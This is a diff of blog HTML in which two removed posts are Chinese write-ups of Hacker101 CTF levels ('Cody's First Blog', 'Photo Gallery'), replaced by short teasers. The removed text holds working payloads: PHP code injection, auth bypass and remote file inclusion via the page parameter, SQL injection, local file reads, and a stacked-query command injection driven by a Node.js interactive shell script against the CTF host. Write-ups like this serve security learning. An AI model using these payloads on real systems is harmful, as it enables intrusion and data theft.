@@ -1254,91 +586,17 @@ Payload 和算法就要改成 CL.TE 的方式了</p>
             
         </h1>
         <div class="content">
-            <h1><span id="codys-first-blog">Cody's First Blog</span></h1>
-<p>這題總共有 3 個 flag
-&lt;!-- more --&gt;</p>
-<h2><span id="0x00">0x00</span></h2>
-<p>一開始畫面長這樣<br>
-<img src="/images/ctf/part5-blog-1-01.png" alt></p>
-<p>裡面有提到好像是用 php 建立的<br>
-試著提交看看 <code>&lt;?php echo phpinfo(); ?&gt;</code><br>
-就得到第一個 FLAG 了，但好像沒有像想像中一樣可以直接 phpinfo<br>
-<img src="/images/ctf/part5-blog-1-02.png" alt>
-<img src="/images/ctf/part5-blog-1-03.png" alt></p>
-<h2><span id="0x01">0x01</span></h2>
-<p>接下來看一下 source code 發現一個特別的地方</p>
-<ol>
-<li>被註解掉的 admin path
-<img src="/images/ctf/part5-blog-2-01.png" alt></li>
-</ol>
-<p>Path: http://34.74.105.127/8a10550a14/?page=admin.auth.inc<br>
-發現看到可以登入的地方<br>
-<img src="/images/ctf/part5-blog-2-02.png" alt></p>
-<p>嘗試輸入 username 看會不會有列舉的漏洞
-以及輸入一些弱密碼嘗試登入<br>
-全部都不行，暫時就先擱置不看<br>
-<img src="/images/ctf/part5-blog-2-03.png" alt></p>
-<p>這邊就開始有點卡住了 ...
-回去首頁看看有什麼特別的東西<br>
-有一句話有提到有用到 <code>include</code> 這個 function<br>
-而剛剛的參數中 <code>?page=admin.auth.inc</code> 是登入用的 php<br>
-接下來這邊試著改成 <code>?page=admin.inc</code> 發現就 bypass 登入的機制到 admin 頁面了<br>
-然後就發現 FLAG 以及可以 approve 剛剛 submit 的 comment<br>
-<img src="/images/ctf/part5-blog-2-04.png" alt></p>
-<h2><span id="0x02">0x02</span></h2>
-<p>按下 approve，是一個 GET Url<br>
-嘗試對 approve 做 SQL Injection 檢測發現沒有問題<br>
-<img src="/images/ctf/part5-blog-3-01.png" alt></p>
-<p>接下來回到首頁，檢視原始碼發現一個特別的東西<br>
-一開始輸入的參數被 approve 後顯示在這裡<br>
-有點特別，但因為不能執行所以沒什麼用就先擱著不動<br>
-<img src="/images/ctf/part5-blog-3-02.png" alt></p>
-<p>接下來嘗試對 page 參數亂打<br>
-<img src="/images/ctf/part5-blog-3-03.png" alt></p>
-<p>看來的確是用 include 去引入別的檔案<br>
-而且還會再參數後面再加入 .php 的副檔名</p>
-<p>這邊嘗試用 php://filter 看能不能讀取原始碼<br>
-結果發現不能 QQ
-<img src="/images/ctf/part5-blog-3-04.png" alt></p>
-<p>看到 include 後回想起首頁提到的<br>
-這個 server 不能對外連線，也只有作者可以上傳檔案<br>
-以及他都是用 include 去引用檔案</p>
-<p>這裡聯想到一件事情<br>
-include 是不是也能用 http:// 去把檔案引入並執行呢?<br>
-於是這邊嘗試引用 <code>http://34.74.105.127/8a10550a14/?page=http://localhost/admin.inc</code><br>
-發現可以引用成功，但還是沒有提供什麼資訊<br>
-<img src="/images/ctf/part5-blog-3-05.png" alt></p>
-<p>但因為用 include 配合 <code>http://</code> 會有一個特色<br>
-假如 test2.php 內容為
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> $body = <span class="string">"&lt;?php echo phpinfo(); ?&gt;"</span> <span class="meta">?&gt;</span></span><br><span class="line">&lt;p&gt;<span class="meta">&lt;?php</span> <span class="keyword">echo</span> $body <span class="meta">?&gt;</span>&lt;/p&gt;</span><br></pre></td></tr></table></figure></p>
-<p>test3.php 內容為
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">include</span>(<span class="string">"test2.php"</span>) <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p>
-<p>直接讀取 test2.php 的時候，是沒辦法執行 <code>phpinfo()</code><br>
-只會出現這樣的結果<br>
-<img src="/images/ctf/part5-blog-3-06.png" alt></p>
-<p>讀取 test3.php 時<br>
-這邊會出現跟直接讀取 test2.php 一樣的結果<br>
-<img src="/images/ctf/part5-blog-3-08.png" alt></p>
-<p>但如果把 test3.php 改成用 <code>http://</code> 協議會怎麼樣呢?<br>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">include</span>(<span class="string">"http://localhost:7888/test2.php"</span>) <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
-它會把 test2.php 顯示的結果，當成原始碼繼續使用下去<br>
-結果就會變成可以成功執行 phpinfo 了<br>
-<img src="/images/ctf/part5-blog-3-07.png" alt></p>
-<p>那因為剛剛一開始頁面也有一樣的邏輯出現<br>
-首頁也有顯示 <code>&lt;?php echo phpinfo(); ?&gt;</code><br>
-<img src="/images/ctf/part5-blog-3-02.png" alt></p>
-<p>那如果說有辦法，讓這個頁面在被 include 一次的話<br>
-就可以成功執行 phpinfo() 了<br>
-所以 payload 會改成以下
-<code>http://34.74.105.127/8a10550a14/?page=http://localhost/index</code><br>
-然後就成功可以執行了<br>
-<img src="/images/ctf/part5-blog-3-09.png" alt></p>
-<p>重新輸入一個參數 <code>&lt;?php readfile(&quot;index.php&quot;) ?&gt;</code> 並且 approve<br>
-回到首頁檢視原始碼發現 FLAG !
-<img src="/images/ctf/part5-blog-3-10.png" alt></p>
-
+            <h1 id="Cody’s-First-Blog"><a href="#Cody’s-First-Blog" class="headerlink" title="Cody’s First Blog"></a>Cody’s First Blog</h1><p>這題總共有 3 個 flag<br>
         </div>
         
+        
+        <div class="level is-mobile">
+            <div class="level-start">
+                <div class="level-item">
+                <a class="button is-size-7 is-light" href="/2019/09/14/hacker101-part5/#more">繼續閱讀</a>
+                </div>
+            </div>
+        </div>
         
         
     </div>
@@ -1382,73 +640,17 @@ include 是不是也能用 http:// 去把檔案引入並執行呢?<br>
             
         </h1>
         <div class="content">
-            <h1><span id="photo-gallery">Photo Gallery</span></h1>
-<p>&lt;!-- more --&gt;</p>
-<h2><span id="0x00">0x00</span></h2>
-<p>一開始畫面長這樣<br>
-<img src="/images/ctf/part4-photo-1-01.png" alt></p>
-<p>發現原始碼有一個 fetch?id=1<br>
-<img src="/images/ctf/part4-photo-1-02.png" alt></p>
-<p>點進去網址發現回傳一個 jpg 的 text 檔案<br>
-<img src="/images/ctf/part4-photo-1-03.png" alt></p>
-<p>從這可以推測他是用 id 去 mysql 取出 filename 然後讀出來的<br>
-加個 ' 發現好像沒有 SQL Injection 的存在，但卻出現 <code>500 Internal Server Error</code><br>
-可能程式有哪邊出錯了，繼續往下測試<br>
-<img src="/images/ctf/part4-photo-1-04.png" alt></p>
-<p>不過當改下 <code>fetch?id=1 union all select 1</code> 以及 <code>fetch?id=1 union all select 1,2</code> 發生一點不同變化
-前者出現跟 <code>fetch?id=1</code> 結果一模一樣 (上圖)<br>
-後者卻出現 <code>500 Internal Server Error</code> (下圖)<br>
-<img src="/images/ctf/part4-photo-1-05.png" alt>
-<img src="/images/ctf/part4-photo-1-06.png" alt></p>
-<p>看來就是有 SQL Injection 的問題了<br>
-接下來找到可以用 <code>fetch?id=1 and length(database()) = 6</code> 這種方式去判斷後者是否為 true<br>
-思路大概跟這篇做法一樣 https://www.hackthis.co.uk/articles/blind-sql-injection<br>
-用各種 <code>length()</code> 以及 <code>like '______'</code> 的方式可以找到相對應的值<br>
-這邊就直接丟 sqlmap 把整個 table dump 出來了<br>
-就發現 FLAG 了
-<img src="/images/ctf/part4-photo-1-07.png" alt></p>
-<h2><span id="0x01">0x01</span></h2>
-<p>這提跟前一提的 <code>fetch?id=1 union all select 1</code> Payload 有關係<br>
-前面有提到是透過 id 去撈 filename 回來去顯示<br>
-改成 <code>fetch?id=123123 union all select &quot;files/adorable.jpg&quot;</code> 發現可以正確觸發<br>
-<img src="/images/ctf/part4-photo-2-01.png" alt></p>
-<p>LFI 漏洞就出現了，我可以任意去讀檔案了<br>
-本來想說這 php 寫的網站用以下的 payload，結果取得不到 ...<br>
-<code>fetch?id=123123 union all select &quot;index.php&quot;</code>
-<img src="/images/ctf/part4-photo-2-02.png" alt></p>
-<p>後來看提示才知道這是用 uwsgi-nginx-flask-docker image 做的<br>
-此 image 原始碼在放在 main.py，所以改成以下 payload 就讀到原始碼，發現第二個 FLAG
-<code>fetch?id=123123 union all select &quot;main.py&quot;</code>
-<img src="/images/ctf/part4-photo-2-03.png" alt></p>
-<h2><span id="0x02">0x02</span></h2>
-<p>看到 source code 之後，發現在取得 used space 那邊有 command injection 的問題<br>
-<code>subprocess.check_output('du -ch %s || exit 0' % ' '.join('files/' + fn for fn in fns), shell=True, stderr=subprocess.STDOUT).strip().rsplit('\n', 1)[-1]</code><br>
-只要能在 filename 加上 ; 再加上後面想要執行的指令就可以觸發 CI 的問題了<br>
-但要觸發他必須要靠 photos table 裡面的 filename 去觸發<br>
-一開始嘗試使用 stacked query 的方式，以下為 payload<br>
-<code>541; UPDATE photos SET filename = '; ls ' WHERE id = 3;</code></p>
-<p>試了很久完全沒有任何反應，本來以為不是 stacked query 這條路<br>
-結果回去翻題目的提示有提到 COMMIT 這個關鍵字<br>
-才想到有時候 SQL 指令下 UPDATE 變更完並不會馬上生效<br>
-而是要下 <code>COMMIT;</code> UPDATE 的語法才會真正觸發<br>
-於是 Payload 改成以下這樣就成功了，下面變成 uwsgi.ini 了<br>
-<code>fetch?id=541; UPDATE photos SET filename = &quot;; ls&quot; WHERE id = 3; COMMIT;</code>
-<img src="/images/ctf/part4-photo-3-01.png" alt></p>
-<p>然後根據 main.py 的 regex 修改一下，然後寫出一個可以一直輸入 command 的 node.js 程式
-<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">inputFunction</span>(<span class="params">readline</span>) </span>&#123;</span><br><span class="line">    readline.question(<span class="string">`Keep input\n\n`</span>, <span class="keyword">async</span> (command) =&gt; &#123;</span><br><span class="line">        <span class="keyword">const</span> axios = <span class="built_in">require</span>(<span class="string">'axios'</span>)</span><br><span class="line">        <span class="keyword">await</span> axios(&#123;</span><br><span class="line">            method: <span class="string">'GET'</span>,</span><br><span class="line">            url: <span class="string">'http://34.74.105.127/8142a5acbe/fetch'</span>,</span><br><span class="line">            params: &#123;</span><br><span class="line">                id: <span class="string">`541; UPDATE photos SET filename = '; <span class="subst">$&#123;command&#125;</span> | tr "\\n" ";" ' WHERE id = 3; COMMIT;`</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;).then(<span class="function"><span class="params">response</span> =&gt;</span> response.data).catch(<span class="function">(<span class="params">err</span>) =&gt;</span> &#123;</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;)</span><br><span class="line">        <span class="keyword">let</span> result = <span class="keyword">await</span> axios(&#123;</span><br><span class="line">            method: <span class="string">'GET'</span>,</span><br><span class="line">            url: <span class="string">'http://34.74.105.127/8142a5acbe/'</span></span><br><span class="line">        &#125;).then(<span class="function"><span class="params">response</span> =&gt;</span> response.data)</span><br><span class="line">        <span class="built_in">console</span>.log(<span class="string">'\n'</span> + result.split(<span class="string">'Space used: '</span>)[<span class="number">1</span>].split(<span class="string">'&lt;/i&gt;&lt;/div&gt;'</span>)[<span class="number">0</span>].replace(<span class="regexp">/;/g</span>, <span class="string">"\n"</span>));  </span><br><span class="line">        inputFunction(readline)</span><br><span class="line">    &#125;)</span><br><span class="line">&#125;</span><br><span class="line">(<span class="function"><span class="params">()</span> =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">const</span> readline = <span class="built_in">require</span>(<span class="string">'readline'</span>).createInterface(&#123;</span><br><span class="line">        input: process.stdin,</span><br><span class="line">        output: process.stdout</span><br><span class="line">    &#125;)</span><br><span class="line">    inputFunction(readline)</span><br><span class="line">&#125;)()</span><br></pre></td></tr></table></figure></p>
-<p>但是逛了老半天 ... 完全不知道 flag 放在哪裡<br>
-跑回去看題目提示到 『enviroment』，才想到有可能放在應用程式裡面的環境<br>
-最後下一個 <code>printenv</code> 就拿到 FLAG 了 ！
-<img src="/images/ctf/part4-photo-3-02.png" alt></p>
-<p>簡單 demo 影片<br>
-<img src="/images/ctf/part4-photo-demo.gif" alt></p>
-<h1><span id="後記">後記</span></h1>
-<p>這題蠻有趣的，學到 stacked query、command injection 以及 LFI
-不過過程中有些真的不知道怎麼做，跑去看提示才知道<br>
-不然真的瞎子摸象摸不太出來 QQ</p>
-
+            <h1 id="Photo-Gallery"><a href="#Photo-Gallery" class="headerlink" title="Photo Gallery"></a>Photo Gallery</h1>
         </div>
         
+        
+        <div class="level is-mobile">
+            <div class="level-start">
+                <div class="level-item">
+                <a class="button is-size-7 is-light" href="/2019/09/10/hacker101-part4/#more">繼續閱讀</a>
+                </div>
+            </div>
+        </div>
         
         
     </div>
